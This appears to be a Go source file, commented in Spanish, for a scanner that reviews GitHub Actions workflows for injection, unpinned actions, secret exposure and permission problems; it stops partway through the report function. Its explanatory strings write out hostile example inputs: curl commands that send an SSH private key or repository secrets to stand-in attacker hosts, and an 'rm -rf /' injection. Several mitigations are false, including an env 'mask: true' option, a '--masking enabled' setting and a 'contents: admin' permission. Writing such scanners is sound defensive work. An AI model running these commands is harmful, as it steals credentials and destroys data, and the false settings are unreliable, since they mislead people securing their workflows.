package main

import (
	"bufio"
	"context"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"regexp"
	"sort"
	"strings"
	"time"

	gh "github.com/google/go-github/v60/github"
	"github.com/joho/godotenv"
	"golang.org/x/oauth2"
	"gopkg.in/yaml.v3"
)

// Estructura ampliada para almacenar información detallada de vulnerabilidades
type Vulnerability struct {
	Type        string   // Tipo de vulnerabilidad
	Description string   // Descripción breve
	Severity    string   // Alta, Media, Baja
	File        string   // Ruta del archivo
	Line        int      // Número de línea
	Details     string   // Detalles específicos (código vulnerable)
	Impact      string   // Descripción del impacto potencial
	Exploit     string   // Descripción de cómo podría explotarse
	Mitigation  string   // Recomendaciones de mitigación
	References  []string // Enlaces a documentación, CVEs, etc.
}

// Estructura para almacenar información de un repositorio
type RepoInfo struct {
	Owner           string
	Name            string
	FullName        string
	Workflows       []string
	Vulnerabilities []Vulnerability
}

func main() {
	// Cargar variables de entorno
	err := godotenv.Load()
	if err != nil {
		log.Printf("Advertencia: No se pudo cargar el archivo .env: %v", err)
	}

	// Argumentos de línea de comandos
	inputFile := flag.String("i", "actions_repos_workflows_go.txt", "Archivo con la lista de repositorios y workflows")
	outputFile := flag.String("o", "workflow_vulnerabilities.txt", "Archivo para guardar el reporte de vulnerabilidades")
	maxRepos := flag.Int("m", 50, "Número máximo de repositorios a analizar")
	format := flag.String("f", "md", "Formato del reporte: md (markdown), sarif (JSON estándar)")
	flag.Parse()

	// Token de GitHub
	githubToken := os.Getenv("GITHUB_PAT")
	if githubToken == "" {
		log.Fatal("Error: Token de GitHub (GITHUB_PAT) no encontrado")
	}

	// Cliente de GitHub
	ctx := context.Background()
	ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: githubToken})
	tc := oauth2.NewClient(ctx, ts)
	client := gh.NewClient(tc)

	// Leer lista de repositorios y workflows
	repos, err := readRepoWorkflows(*inputFile)
	if err != nil {
		log.Fatalf("Error al leer archivo de entrada: %v", err)
	}

	log.Printf("Se encontraron %d repositorios para analizar", len(repos))
	count := 0
	var allVulnerabilities []Vulnerability

	// Analizar cada repositorio (hasta el límite máximo)
	for _, repo := range repos {
		if count >= *maxRepos {
			log.Printf("Alcanzado el límite de %d repositorios", *maxRepos)
			break
		}

		log.Printf("Analizando repositorio %s (%d/%d)", repo.FullName, count+1, *maxRepos)

		// Analizar cada workflow del repositorio
		repoVulnerabilities, err := analyzeWorkflows(ctx, client, repo)
		if err != nil {
			log.Printf("Error al analizar workflows para %s: %v", repo.FullName, err)
			continue
		}

		if len(repoVulnerabilities) > 0 {
			allVulnerabilities = append(allVulnerabilities, repoVulnerabilities...)
			log.Printf("  Se encontraron %d vulnerabilidades potenciales", len(repoVulnerabilities))
		} else {
			log.Printf("  No se encontraron vulnerabilidades")
		}

		count++
		time.Sleep(500 * time.Millisecond) // Pequeña pausa para evitar límites de tasa
	}

	// Guardar resultados en el formato especificado
	if *format == "sarif" {
		err = saveVulnerabilitiesAsSARIF(allVulnerabilities, *outputFile)
		if err != nil {
			log.Fatalf("Error al guardar reporte en formato SARIF: %v", err)
		}
		log.Printf("\nAnálisis completado. Total de vulnerabilidades encontradas: %d", len(allVulnerabilities))
		log.Printf("Reporte SARIF guardado en '%s'", *outputFile)
	} else {
		// Formato por defecto: Markdown
		err = saveDetailedVulnerabilityReport(allVulnerabilities, *outputFile)
		if err != nil {
			log.Fatalf("Error al guardar reporte: %v", err)
		}
		log.Printf("\nAnálisis completado. Total de vulnerabilidades encontradas: %d", len(allVulnerabilities))
		log.Printf("Reporte detallado guardado en '%s'", *outputFile)
	}
}

// Leer el archivo con la lista de repositorios y sus workflows
func readRepoWorkflows(filename string) ([]RepoInfo, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("no se pudo abrir el archivo: %w", err)
	}
	defer file.Close()

	var repos []RepoInfo
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()
		if line == "" {
			continue
		}

		parts := strings.SplitN(line, ": ", 2)
		if len(parts) != 2 {
			log.Printf("Advertencia: Línea con formato incorrecto: %s", line)
			continue
		}

		fullName := parts[0]
		workflows := strings.Split(parts[1], ",")

		// Extraer owner y nombre del repositorio
		nameParts := strings.SplitN(fullName, "/", 2)
		if len(nameParts) != 2 {
			log.Printf("Advertencia: Nombre de repositorio incorrecto: %s", fullName)
			continue
		}

		repos = append(repos, RepoInfo{
			Owner:     nameParts[0],
			Name:      nameParts[1],
			FullName:  fullName,
			Workflows: workflows,
		})
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error al leer el archivo: %w", err)
	}

	return repos, nil
}

// Analizar los workflows de un repositorio
func analyzeWorkflows(ctx context.Context, client *gh.Client, repo RepoInfo) ([]Vulnerability, error) {
	var vulnerabilities []Vulnerability

	for _, workflowPath := range repo.Workflows {
		// Obtener contenido del archivo de workflow
		content, _, _, err := client.Repositories.GetContents(
			ctx,
			repo.Owner,
			repo.Name,
			workflowPath,
			nil,
		)

		if err != nil {
			log.Printf("  Error al obtener contenido de %s: %v", workflowPath, err)
			continue
		}

		// Decodificar contenido
		decodedContent, err := base64.StdEncoding.DecodeString(*content.Content)
		if err != nil {
			log.Printf("  Error al decodificar contenido de %s: %v", workflowPath, err)
			continue
		}

		// Parsear YAML
		var workflowData map[string]interface{}
		err = yaml.Unmarshal(decodedContent, &workflowData)
		if err != nil {
			log.Printf("  Error al parsear YAML de %s: %v", workflowPath, err)
			continue
		}

		// Analizar vulnerabilidades en el workflow
		fileVulns := detectVulnerabilities(workflowPath, string(decodedContent), workflowData)
		vulnerabilities = append(vulnerabilities, fileVulns...)
	}

	return vulnerabilities, nil
}

// Detectar vulnerabilidades en un workflow con información más detallada
func detectVulnerabilities(filePath, content string, workflowData map[string]interface{}) []Vulnerability {
	var vulnerabilities []Vulnerability

	// Dividir el contenido en líneas para referencia
	lines := strings.Split(content, "\n")

	// 1. Buscar inyección de comandos en acciones run
	cmdInjectionVulns := detectCommandInjection(filePath, lines, workflowData)
	vulnerabilities = append(vulnerabilities, cmdInjectionVulns...)

	// 2. Verificar uso inseguro de acciones de terceros
	actionVulns := detectUnsafeActions(filePath, lines, workflowData)
	vulnerabilities = append(vulnerabilities, actionVulns...)

	// 3. Buscar exposición de secretos
	secretVulns := detectExposedSecrets(filePath, lines, workflowData)
	vulnerabilities = append(vulnerabilities, secretVulns...)

	// 4. Verificar permisos excesivos
	permissionVulns := detectExcessivePermissions(filePath, lines, workflowData)
	vulnerabilities = append(vulnerabilities, permissionVulns...)

	// 5. Verificar pull_request_target sin restricciones
	prTargetVulns := detectPullRequestTargetVulns(filePath, lines, workflowData)
	vulnerabilities = append(vulnerabilities, prTargetVulns...)

	// 6. Detectar scripts inyectables
	scriptInjectionVulns := detectScriptInjection(filePath, lines, workflowData)
	vulnerabilities = append(vulnerabilities, scriptInjectionVulns...)

	return vulnerabilities
}

// Detectar posible inyección de comandos con información detallada
func detectCommandInjection(filePath string, lines []string, workflowData map[string]interface{}) []Vulnerability {
	var vulnerabilities []Vulnerability

	// Patrones revisados para detectar uso inseguro de inputs en comandos
	unsafeInputPattern := regexp.MustCompile(`run:.*\$\{\{\s*github\.event\.(issue|pull_request|comment|discussion|review|head_ref|inputs|client_payload)\..*\s*\}\}`)

	// Casos particularmente riesgosos: inputs directos y client_payload
	highRiskPattern := regexp.MustCompile(`run:.*\$\{\{\s*github\.event\.(inputs|client_payload)\..*\s*\}\}`)

	for i, line := range lines {
		if unsafeInputPattern.MatchString(line) && !strings.Contains(line, "${{ github.event.repository") {
			vulnDetails := line
			severity := "Media"

			// Evaluar si es un caso de alto riesgo
			if highRiskPattern.MatchString(line) {
				severity = "Alta"
			}

			// Evitar falsos positivos cuando hay verificación de inputs o están escapados
			if strings.Contains(line, "||") || strings.Contains(line, "&&") ||
				strings.Contains(line, "\"${{") || strings.Contains(line, "'${{") {
				continue
			}

			impact := "Un atacante podría inyectar comandos arbitrarios que se ejecutarían en el contexto del workflow, " +
				"potencialmente comprometiendo secretos, modificando el repositorio o pivotando a otros sistemas."

			exploit := "Ejemplo de explotación: si el workflow usa `run: echo ${{ github.event.inputs.parameter }}`, " +
				"un atacante podría proporcionar como input: `harmless && curl -d \"$(cat ~/.ssh/id_rsa)\" https://malicious.com`. " +
				"Esto ejecutaría el comando malicioso después del comando legítimo."

			vulnerabilities = append(vulnerabilities, Vulnerability{
				Type:        "Command Injection",
				Description: "Posible inyección de comandos a través de inputs no sanitizados",
				Severity:    severity,
				File:        filePath,
				Line:        i + 1,
				Details:     vulnDetails,
				Impact:      impact,
				Exploit:     exploit,
				Mitigation: "1. Validar y sanitizar estrictamente los inputs antes de usarlos\n" +
					"2. Evitar pasar inputs directamente a comandos shell\n" +
					"3. Usar GitHub Actions inputs con opción 'default' y validación 'required'\n" +
					"4. Considerar el uso de una acción dedicada en lugar de scripts shell para operaciones críticas",
				References: []string{
					"https://docs.github.com/es/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections",
					"https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
					"https://github.com/marketplace/actions/create-json-payload - Para manipular datos de forma segura",
					"https://owasp.org/www-community/attacks/Command_Injection",
				},
			})
		}
	}

	return vulnerabilities
}

// Detectar uso de acciones de terceros inseguras con información detallada
func detectUnsafeActions(filePath string, lines []string, workflowData map[string]interface{}) []Vulnerability {
	var vulnerabilities []Vulnerability

	// Patrones para detectar usos inseguros de acciones
	actionWithoutVersionPattern := regexp.MustCompile(`uses:\s+[^@]+$`)
	actionWithBranchPattern := regexp.MustCompile(`uses:\s+[^@]+@\s*(main|master|develop|dev)`)

	// Patrón para verificar si se usa un SHA completo (40 caracteres hex)
	fullSHAPattern := regexp.MustCompile(`uses:\s+[^@]+@[0-9a-f]{40}`)

	for i, line := range lines {
		trimmedLine := strings.TrimSpace(line)
		if strings.HasPrefix(trimmedLine, "uses:") {
			// Verificar si ya usa un SHA completo (práctica segura)
			if fullSHAPattern.MatchString(trimmedLine) {
				continue // Esta referencia es segura, usa un SHA completo
			}

			// Caso 1: Acción sin versión específica
			if actionWithoutVersionPattern.MatchString(trimmedLine) {
				vulnerabilities = append(vulnerabilities, Vulnerability{
					Type:        "Unsafe Action Reference",
					Description: "Acción referenciada sin versión específica",
					Severity:    "Media",
					File:        filePath,
					Line:        i + 1,
					Details:     trimmedLine,
					Impact: "Si la acción se actualiza con cambios maliciosos o tiene vulnerabilidades, " +
						"el workflow automáticamente usará la nueva versión sin verificación, permitiendo" +
						"ejecución de código no auditado en tu flujo de trabajo.",
					Exploit: "Ejemplo: Un atacante podría hacer un fork de la acción referenciada, " +
						"obtener control del repositorio original mediante ingeniería social o " +
						"vulnerabilidades, y luego modificar la acción para exfiltrar secretos o " +
						"comprometer el entorno de CI/CD.",
					Mitigation: "Especificar un hash SHA completo (40 caracteres) para la referencia de la acción. " +
						"Por ejemplo, en lugar de `actions/checkout@v2`, usar " +
						"`actions/checkout@a81bbbf8298c0fa03ea29cdc473d45769f953675`.",
					References: []string{
						"https://docs.github.com/es/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions",
						"https://blog.aquasec.com/github-actions-security-supply-chain",
						"https://securitylab.github.com/research/github-actions-untrusted-input/",
						"https://docs.github.com/es/actions/creating-actions/about-custom-actions#using-release-management-for-actions",
					},
				})
			}

			// Caso 2: Acción referenciando una rama (no un tag o commit)
			if actionWithBranchPattern.MatchString(trimmedLine) {
				vulnerabilities = append(vulnerabilities, Vulnerability{
					Type:        "Unsafe Action Reference",
					Description: "Acción referenciada usando una rama en lugar de una versión fija",
					Severity:    "Alta",
					File:        filePath,
					Line:        i + 1,
					Details:     trimmedLine,
					Impact: "Usar una referencia a una rama permite que cambios maliciosos se introduzcan " +
						"en tu workflow sin aviso. Si la rama se actualiza, tu workflow ejecutará " +
						"automáticamente el nuevo código, exponiendo a ataques de suministro en la cadena.",
					Exploit: "Un ejemplo real ocurrió en 2021 cuando un actor malintencionado comprometió " +
						"una acción popular y agregó código para recolectar secretos y tokens. " +
						"Quienes referenciaban la acción por rama automáticamente ejecutaron el código malicioso.",
					Mitigation: "1. Usar siempre un hash SHA de commit completo\n" +
						"2. Auditar el código de las acciones de terceros antes de utilizarlas\n" +
						"3. Considerar usar acciones verificadas cuando sea posible o crear tus propias acciones para funcionalidades críticas",
					References: []string{
						"https://docs.github.com/es/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions",
						"https://docs.github.com/es/actions/creating-actions/about-custom-actions#using-release-management-for-actions",
						"https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
						"https://blog.teddykatz.com/2021/03/17/github-actions-write-access.html",
					},
				})
			}
		}
	}

	return vulnerabilities
}

// Detectar posible exposición de secretos con información detallada
func detectExposedSecrets(filePath string, lines []string, workflowData map[string]interface{}) []Vulnerability {
	var vulnerabilities []Vulnerability

	// Patrones para detectar exposición potencial de secretos
	debugSecretPattern := regexp.MustCompile(`(?i)(echo|print|console\.log|printf|cat).*\$\{\{\s*secrets\.`)
	envSecretPattern := regexp.MustCompile(`env:.*\$\{\{\s*secrets\..*\s*\}\}`)

	// Buscar uso de secrets en logs o debug
	for i, line := range lines {
		// Caso 1: Secretos potencialmente expuestos en comandos de depuración
		if debugSecretPattern.MatchString(line) {
			vulnerabilities = append(vulnerabilities, Vulnerability{
				Type:        "Secret Exposure",
				Description: "Posible exposición de secretos en comandos de salida/depuración",
				Severity:    "Alta",
				File:        filePath,
				Line:        i + 1,
				Details:     line,
				Impact: "Los secretos expuestos en logs son visibles en la interfaz de GitHub Actions " +
					"y pueden ser capturados por cualquier persona con acceso a los logs. " +
					"Esto compromete la confidencialidad de credenciales, tokens y otras informaciones sensibles.",
				Exploit: "Cualquier usuario con acceso a los logs del repositorio podría ver los secretos expuestos " +
					"y utilizarlos para acceder a sistemas, APIs o servicios protegidos. Los secretos podrían " +
					"copiarse y utilizarse desde cualquier ubicación, sin dejar rastro de este uso no autorizado.",
				Mitigation: "1. Nunca usar comandos echo, print o similares con secretos\n" +
					"2. Si se necesita usar un secreto en comandos, asegurarse de que no se imprima su valor\n" +
					"3. Utilizar grupos de pasos (step groups) con '--masking enabled' para ocultar salidas sensibles\n" +
					"4. Considerar el uso de entornos (environments) con revisores obligatorios para workflows que manejan secretos",
				References: []string{
					"https://docs.github.com/es/actions/security-guides/encrypted-secrets",
					"https://docs.github.com/es/actions/security-guides/security-hardening-for-github-actions#using-secrets",
					"https://securitylab.github.com/research/token-scanning/",
					"https://docs.github.com/es/actions/using-workflows/workflow-commands-for-github-actions#masking-a-value-in-log",
				},
			})
		}

		// Caso 2: Secretos exportados como variables de entorno sin máscara
		if envSecretPattern.MatchString(line) && !strings.Contains(line, "mask: true") {
			vulnerabilities = append(vulnerabilities, Vulnerability{
				Type:        "Secret Exposure",
				Description: "Secreto expuesto como variable de entorno sin máscara",
				Severity:    "Media",
				File:        filePath,
				Line:        i + 1,
				Details:     line,
				Impact: "Los secretos definidos como variables de entorno sin la opción 'mask: true' " +
					"pueden ser accidentalmente expuestos si los comandos ejecutados muestran las " +
					"variables de entorno (ej: 'env' en Linux, 'set' en Windows).",
				Exploit: "Cualquier script o acción que muestre variables de entorno podría revelar " +
					"involuntariamente los secretos. Por ejemplo, si un script de depuración ejecuta " +
					"'printenv' o si hay un error que causa un volcado de variables.",
				Mitigation: "1. Usar 'mask: true' al definir variables de entorno con secretos\n" +
					"2. Preferir pasar secretos directamente a las acciones que los necesitan en lugar de configurarlos como variables de entorno\n" +
					"3. Limitar el alcance de los secretos sólo a los pasos que los necesitan",
				References: []string{
					"https://docs.github.com/es/actions/security-guides/encrypted-secrets#using-encrypted-secrets-in-a-workflow",
					"https://docs.github.com/es/actions/learn-github-actions/environment-variables",
					"https://github.blog/changelog/2021-10-04-github-actions-masked-inputs-in-workflow-logs/",
				},
			})
		}
	}

	return vulnerabilities
}

// Detectar permisos excesivos con información detallada
func detectExcessivePermissions(filePath string, lines []string, workflowData map[string]interface{}) []Vulnerability {
	var vulnerabilities []Vulnerability

	// Buscar permisos excesivos a nivel de workflow
	if permissions, ok := workflowData["permissions"].(map[string]interface{}); ok {
		// Caso: Permiso completo de escritura al contenido
		if writeAll, ok := permissions["contents"].(string); ok && writeAll == "write" {
			vulnerabilities = append(vulnerabilities, Vulnerability{
				Type:        "Excessive Permissions",
				Description: "El workflow tiene permisos de escritura completos sobre el repositorio",
				Severity:    "Media",
				File:        filePath,
				Line:        0, // No podemos determinar la línea exacta fácilmente
				Details:     "permissions: contents: write",
				Impact: "Los permisos de escritura sobre el contenido del repositorio permiten a las acciones " +
					"modificar código, crear commits, y potencialmente introducir código malicioso. " +
					"Si una acción es comprometida, podría modificar archivos críticos o eludir protecciones.",
				Exploit: "Un actor malicioso que comprometa una de las acciones o scripts utilizados podría " +
					"aprovechar estos permisos para introducir backdoors, modificar archivos de configuración, " +
					"o agregar dependencias maliciosas que se propagarían a la aplicación o a futuras ejecuciones.",
				Mitigation: "1. Seguir el principio de mínimo privilegio - usar 'permissions: read-all' por defecto\n" +
					"2. Otorgar permisos específicos sólo para los recursos necesarios\n" +
					"3. Limitar los permisos de escritura a scopes específicos (ej: issues: write) en lugar de contents\n" +
					"4. Considerar el uso de trabajos (jobs) separados con diferentes niveles de permiso",
				References: []string{
					"https://docs.github.com/es/actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token",
					"https://docs.github.com/es/actions/security-guides/security-hardening-for-github-actions#considering-cross-repository-access",
					"https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
					"https://github.blog/2021-04-19-how-we-use-and-secure-github-actions-at-github/",
				},
			})
		}

		// Caso: Permisos a nivel de admin
		if adminLevel, ok := permissions["contents"].(string); ok && adminLevel == "admin" {
			vulnerabilities = append(vulnerabilities, Vulnerability{
				Type:        "Excessive Permissions",
				Description: "El workflow tiene permisos de administrador",
				Severity:    "Alta",
				File:        filePath,
				Line:        0,
				Details:     "permissions: contents: admin",
				Impact: "Los permisos de nivel administrador otorgan control casi total sobre el repositorio, " +
					"incluyendo la capacidad de modificar configuraciones críticas, protecciones de ramas, " +
					"y potencialmente comprometer toda la seguridad del repositorio.",
				Exploit: "Un atacante podría, por ejemplo, desactivar la protección de ramas principales, " +
					"eliminar reglas de revisión de código, modificar webhooks para exfiltrar información, " +
					"o manipular la configuración de CODEOWNERS para eludir las revisiones de seguridad.",
				Mitigation: "1. Nunca usar permisos de nivel admin en workflows\n" +
					"2. Para operaciones administrativas, considerar un proceso manual o un sistema de aprobación\n" +
					"3. Segmentar las operaciones sensibles en repositorios separados con acceso restringido",
				References: []string{
					"https://docs.github.com/es/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token",
					"https://docs.github.com/es/organizations/managing-user-access-to-your-organizations-repositories/repository-roles-for-an-organization",
					"https://github.blog/2021-04-19-how-we-use-and-secure-github-actions-at-github/",
				},
			})
		}
	} else if _, ok := workflowData["permissions"]; !ok {
		// Si no se especifican permisos, advertir sobre permisos implícitos
		vulnerabilities = append(vulnerabilities, Vulnerability{
			Type:        "Undefined Permissions",
			Description: "Workflow sin permisos explícitamente definidos",
			Severity:    "Baja",
			File:        filePath,
			Line:        0,
			Details:     "No se encontró cláusula 'permissions:' en el workflow",
			Impact: "Sin una definición explícita de permisos, el workflow usará los permisos predeterminados " +
				"del repositorio, que generalmente incluyen acceso de escritura al contenido. Esto puede " +
				"otorgar más permisos de los necesarios, ampliando la superficie de ataque.",
			Exploit: "El token GITHUB_TOKEN con permisos implícitos podría ser utilizado por acciones " +
				"comprometidas para realizar operaciones no deseadas en el repositorio.",
			Mitigation: "Definir explícitamente permisos mínimos al inicio del workflow:\n```yaml\npermissions: read-all  # Establece todos los permisos como solo lectura\n```\n" +
				"Luego otorgar permisos específicos sólo donde sea necesario.",
			References: []string{
				"https://docs.github.com/es/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token",
				"https://github.blog/changelog/2021-04-20-github-actions-permission-options-for-the-github_token/",
				"https://github.blog/2023-02-02-enabling-fine-grained-permissions-github-actions-enterprise/",
			},
		})
	}

	// Buscar GITHUB_TOKEN con permisos no especificados en los pasos
	tokenWithPermissionsPattern := regexp.MustCompile(`token:\s*\$\{\{\s*secrets\.GITHUB_TOKEN\s*\}\}`)

	for i, line := range lines {
		if tokenWithPermissionsPattern.MatchString(line) {
			// Verificar si hay un job o step cercano con permisos explícitos
			hasExplicitPermissions := false

			// Buscar hacia arriba y abajo para permisos
			for j := max(0, i-10); j < min(len(lines), i+10); j++ {
				if strings.Contains(lines[j], "permissions:") {
					hasExplicitPermissions = true
					break
				}
			}

			if !hasExplicitPermissions {
				vulnerabilities = append(vulnerabilities, Vulnerability{
					Type:        "Undefined Token Permissions",
					Description: "Uso de GITHUB_TOKEN sin permisos explícitamente definidos",
					Severity:    "Baja",
					File:        filePath,
					Line:        i + 1,
					Details:     line,
					Impact:      "El token está utilizando permisos predeterminados que podrían ser excesivos para la operación que se está realizando.",
					Exploit:     "Una acción comprometida podría usar el token con permisos más amplios de los necesarios para la tarea específica.",
					Mitigation:  "Definir permisos explícitos para el job o el paso que utiliza el token:\n```yaml\njobs:\n  example_job:\n    permissions:\n      issues: write\n      contents: read\n```",
					References: []string{
						"https://docs.github.com/es/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token",
						"https://github.blog/changelog/2021-04-20-github-actions-permission-options-for-the-github_token/",
					},
				})
			}
		}
	}

	return vulnerabilities
}

// Detectar vulnerabilidades relacionadas con pull_request_target con información detallada
func detectPullRequestTargetVulns(filePath string, lines []string, workflowData map[string]interface{}) []Vulnerability {
	var vulnerabilities []Vulnerability

	// Verificar si el workflow se activa con pull_request_target
	hasPullRequestTarget := false

	// Buscar diferentes formas de definir pull_request_target
	if on, ok := workflowData["on"].(interface{}); ok {
		// Caso 1: on: pull_request_target
		if prTarget, ok := on.(string); ok && prTarget == "pull_request_target" {
			hasPullRequestTarget = true
		}

		// Caso 2: on: ["push", "pull_request_target", ...]
		if events, ok := on.([]interface{}); ok {
			for _, event := range events {
				if eventStr, ok := event.(string); ok && eventStr == "pull_request_target" {
					hasPullRequestTarget = true
					break
				}
			}
		}

		// Caso 3: on: { pull_request_target: {...} }
		if events, ok := on.(map[string]interface{}); ok {
			if _, ok := events["pull_request_target"]; ok {
				hasPullRequestTarget = true
			}
		}
	}

	if hasPullRequestTarget {
		// Buscar patrones peligrosos en workflows con pull_request_target
		hasCheckout := false
		checkoutWithRef := false
		hasScriptExecution := false

		// Buscar acciones de checkout y ver si usan refs específicas
		checkoutPattern := regexp.MustCompile(`uses:\s+actions/checkout@`)
		refSafePattern := regexp.MustCompile(`ref:\s*\$\{\{\s*github\.event\.pull_request\.base\.sha\s*\}\}`)
		refUnsafePattern := regexp.MustCompile(`ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.`)
		scriptRunPattern := regexp.MustCompile(`run:\s*`)

		for i, line := range lines {
			if checkoutPattern.MatchString(line) {
				hasCheckout = true

				// Buscar en las líneas cercanas si hay una referencia
				for j := max(0, i-5); j < min(len(lines), i+5); j++ {
					if refSafePattern.MatchString(lines[j]) {
						checkoutWithRef = true // Referencia segura encontrada
						break
					}
					if refUnsafePattern.MatchString(lines[j]) {
						// Encontró una referencia específica pero insegura
						hasCheckout = true
						checkoutWithRef = false

						vulnerabilities = append(vulnerabilities, Vulnerability{
							Type:        "Unsafe pull_request_target Reference",
							Description: "Checkout del código de un PR en un workflow con pull_request_target usando una referencia insegura",
							Severity:    "Alta",
							File:        filePath,
							Line:        j + 1,
							Details:     lines[j],
							Impact: "Esta configuración permite que código arbitrario de PRs externos se ejecute con acceso " +
								"a secretos del repositorio, creando un riesgo grave de robo de secretos y compromiso del repositorio.",
							Exploit: "Un atacante puede enviar un PR con código malicioso que se ejecutará en el contexto del workflow " +
								"con pull_request_target. Por ejemplo, podrían agregar código que extraiga secretos y los envíe a un " +
								"servidor externo.",
							Mitigation: "Si necesitas hacer checkout del código del PR, usa la referencia base (segura): \n" +
								"`ref: ${{ github.event.pull_request.base.sha }}`\n" +
								"No ejecutes ningún código del PR.",
							References: []string{
								"https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
								"https://docs.github.com/es/actions/using-workflows/events-that-trigger-workflows#pull_request_target",
								"https://github.blog/2020-08-03-github-actions-improvements-for-fork-and-pull-request-workflows/",
								"https://github.blog/2021-02-02-avoiding-github-actions-attacks/",
							},
						})
						break
					}
				}
			}

			// Buscar ejecución de scripts en el workflow
			if scriptRunPattern.MatchString(line) {
				hasScriptExecution = true
			}
		}

		// Si tiene checkout sin referencia segura y ejecuta scripts
		if hasCheckout && !checkoutWithRef && hasScriptExecution {
			vulnerabilities = append(vulnerabilities, Vulnerability{
				Type:        "Unsafe pull_request_target",
				Description: "Workflow con pull_request_target ejecuta código potencialmente inseguro",
				Severity:    "Alta",
				File:        filePath,
				Line:        0,
				Details:     "Este workflow se activa con pull_request_target, hace checkout sin especificar una ref segura, y ejecuta scripts",
				Impact: "Una vulnerabilidad extremadamente grave que permite a un atacante ejecutar código arbitrario " +
					"en el contexto privilegiado de un workflow, con acceso a todos los secretos del repositorio. " +
					"Esto puede llevar a la comprometer completamente el repositorio y todos los sistemas conectados.",
				Exploit: "Caso real: En 2021, múltiples repositorios populares fueron vulnerables a este ataque. Un atacante " +
					"podía enviar un PR que modificaba los archivos del workflow para exfiltrar secretos. Por ejemplo, " +
					"agregando `run: curl -d \"${{ secrets.SUPER_SECRET }}\" https://attacker.com/`.",
				Mitigation: "1. No usar pull_request_target si es posible\n" +
					"2. Si es necesario, nunca hacer checkout del código del PR\n" +
					"3. Si absolutamente necesitas hacer checkout, usa solo `github.event.pull_request.base.sha` y nunca ejecutes código del PR\n" +
					"4. Implementar permisos mínimos para el token GITHUB_TOKEN",
				References: []string{
					"https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
					"https://github.blog/2020-08-03-github-actions-improvements-for-fork-and-pull-request-workflows/",
					"https://docs.github.com/es/actions/using-workflows/events-that-trigger-workflows#pull_request_target",
					"https://blog.teddykatz.com/2021/03/17/github-actions-write-access.html",
				},
			})
		}
	}

	return vulnerabilities
}

// Detectar potenciales inyecciones en scripts
func detectScriptInjection(filePath string, lines []string, workflowData map[string]interface{}) []Vulnerability {
	var vulnerabilities []Vulnerability

	// Buscar uso peligroso de inputs en scripts multilinea
	inScript := false
	scriptContent := ""

	for i, line := range lines {
		trimmedLine := strings.TrimSpace(line)

		// Detectar inicio de bloque de script multilinea
		if strings.HasPrefix(trimmedLine, "run: |") || strings.HasPrefix(trimmedLine, "run:|") {
			inScript = true
			scriptContent = ""
			continue
		}

		// Recolectar contenido del script mientras estamos en uno
		if inScript {
			if !strings.HasPrefix(trimmedLine, "-") && !strings.HasPrefix(trimmedLine, "run:") &&
				len(trimmedLine) > 0 && trimmedLine[0] != '#' {
				scriptContent += line + "\n"

				// Buscar inputs no sanitizados en script
				if strings.Contains(line, "${{") && strings.Contains(line, "github.event") &&
					!strings.Contains(line, "\"${{") && !strings.Contains(line, "'${{") {

					// Excluir patrones seguros comunes
					if !strings.Contains(line, "github.event.repository") &&
						!strings.Contains(line, "github.event.number") {

						vulnerabilities = append(vulnerabilities, Vulnerability{
							Type:        "Script Injection",
							Description: "Script multilinea con posible inyección de parámetros no sanitizados",
							Severity:    "Media",
							File:        filePath,
							Line:        i + 1,
							Details:     line,
							Impact: "Los scripts multilinea que utilizan valores de eventos de GitHub sin sanitizar " +
								"son susceptibles a inyecciones de comandos, lo que podría permitir a un atacante " +
								"ejecutar comandos arbitrarios en el contexto del workflow.",
							Exploit: "Por ejemplo, si el script contiene algo como `echo ${{ github.event.inputs.message }}`, " +
								"un atacante podría ingresar: `mensaje legítimo; rm -rf /` como input, lo que ejecutaría " +
								"el comando destructivo después del comando echo.",
							Mitigation: "1. Sanitizar todos los inputs antes de usarlos en scripts\n" +
								"2. Usar comillas para encapsular valores: `echo \"${{ github.event.inputs.message }}\"`\n" +
								"3. Validar inputs contra un patrón esperado usando expresiones regulares o listas permitidas\n" +
								"4. Considerar usar una acción personalizada para procesar inputs en lugar de scripts shell",
							References: []string{
								"https://docs.github.com/es/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable",
								"https://securitylab.github.com/research/github-actions-untrusted-input/",
								"https://owasp.org/www-community/attacks/Command_Injection",
							},
						})
					}
				}
			} else if !strings.HasPrefix(trimmedLine, " ") && len(strings.TrimSpace(line)) > 0 {
				// Fin del bloque de script
				inScript = false
			}
		}
	}

	return vulnerabilities
}

// Función para generar reporte de vulnerabilidades detallado
func saveDetailedVulnerabilityReport(vulnerabilities []Vulnerability, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("no se pudo crear el archivo: %w", err)
	}
	defer file.Close()

	w := bufio.NewWriter(file)
	defer w.Flush()

	// Escribir encabezado
	fmt.Fprintf(w, "# Reporte de Vulnerabilidades en GitHub Actions Workflows\n\n")
	fmt.Fprintf(w, "**Fecha**: %s\n\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Fprintf(w, "**Total de vulnerabilidades encontradas**: %d\n\n", len(vulnerabilities))
	fmt.Fprintf(w, "Este informe ha sido generado automáticamente para detectar patrones de vulnerabilidad en flujos de trabajo de GitHub Actions.\n")
	fmt.Fprintf(w, "Las vulnerabilidades identificadas representan riesgos potenciales que deberían ser validados y mitigados según su contexto específico.\n\n")

	// Agrupar por tipo y severidad
	vulnerabilityTypes := make(map[string][]Vulnerability)
	severityCounts := map[string]int{"Alta": 0, "Media": 0, "Baja": 0}

	for _, vuln := range vulnerabilities {
		vulnerabilityTypes[vuln.Type] = append(vulnerabilityTypes[vuln.Type], vuln)
